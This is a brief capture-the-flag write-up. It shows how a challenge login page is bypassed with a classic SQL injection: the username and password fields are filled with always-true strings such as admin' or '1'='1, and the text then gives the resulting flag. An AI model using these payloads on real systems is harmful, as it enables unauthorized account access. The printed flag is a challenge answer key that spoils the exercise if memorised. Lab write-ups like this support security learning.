## Method

We go to the login page and execute a standard SQL injection attack on the admin user which is mentioned in the notification above.

`username`:`admin' or '1'='1`
`password`:`' or '1'='1`

After login we see a notification containing:
```
Currently logged in user: 'admin'. Full name: 'John Doe'. FLAG{DZIVI:85746538761-WEB}.
```